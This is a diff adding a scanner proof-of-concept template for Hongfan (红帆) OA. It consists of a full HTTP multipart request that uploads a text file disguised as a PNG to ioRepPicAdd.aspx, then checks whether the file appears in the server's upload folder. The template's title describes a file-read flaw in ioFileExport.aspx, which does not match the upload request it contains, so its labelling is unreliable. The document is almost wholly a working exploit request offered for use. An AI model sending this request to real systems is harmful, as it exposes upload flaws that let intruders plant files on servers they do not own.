@@ -1,0 +1,39 @@
+﻿<DudePoc_Name>红帆 OA ioFileExport.aspx 任意文件读取</DudePoc_Name>
+<DudePoc_Description></DudePoc_Description>
+<DudePoc_SetHeader>
+POST /ioffice/prg/set/Report/ioRepPicAdd.aspx HTTP/1.1
+Host: $<AttackHost>$
+Content-Length: 0
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary92UKW0leBBAHGaI4
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+User-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.57
+</DudePoc_SetHeader>
+<DudePoc_SetData>
+------WebKitFormBoundary92UKW0leBBAHGaI4
+Content-Disposition: form-data; name="__EVENTTARGET"
+
+ctl00$cntButton$cmdOK
+------WebKitFormBoundary92UKW0leBBAHGaI4
+Content-Disposition: form-data; name="__EVENTARGUMENT"
+
+
+------WebKitFormBoundary92UKW0leBBAHGaI4
+Content-Disposition: form-data; name="__VIEWSTATE"
+
+/wEPDwUKMTQwODAxNTczOQ9kFgJmDw8WBh4JUGFnZVRpdGxlBQzmt7vliqDlm77niYceDFBhZ2VUaXRsZVNlbAspZWlPZmZpY2UuaW9QYWdlRWRpdCtQYWdlVGl0bGVTZWxPcHRpb24sIGlPZmZpY2UsIFZlcnNpb249MS4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1udWxsAx4McGVyY2VudHdpZHRoAv////8PZBYCAgMPZBYCAgEPFgIeB2VuY3R5cGUFE211bHRpcGFydC9mb3JtLWRhdGEWAgIFD2QWAmYPZBYCZg9kFggCAw8PFgIeB1Zpc2libGVoZBYCAgEPDxYCHgRUZXh0BQzmt7vliqDlm77niYdkZAIFDw8WAh8EaGQWAgIBDw8WAh8FBQzmt7vliqDlm77niYdkZAIHDxYCHwRoZAILD2QWAgIDDw9kFgIeB29uY2xpY2sFDndpbmRvdy5jbG9zZSgpZGQ=
+------WebKitFormBoundary92UKW0leBBAHGaI4
+Content-Disposition: form-data; name="ctl00$cntForm$File1"; filename="hiword.txt"
+Content-Type: image/png
+
+hiword!!!
+
+------WebKitFormBoundary92UKW0leBBAHGaI4--
+</DudePoc_SetData>
+<DudePoc_VerifyStatusCode>200</DudePoc_VerifyStatusCode>
+<DudePoc_VerifyData>cultureInfo</DudePoc_VerifyData>
+<DudePoc_VerifyFile>/iOffice/upfiles/rep/pic/hiword.txt</DudePoc_VerifyFile>
+<DudePoc_AttackCode></DudePoc_AttackCode>
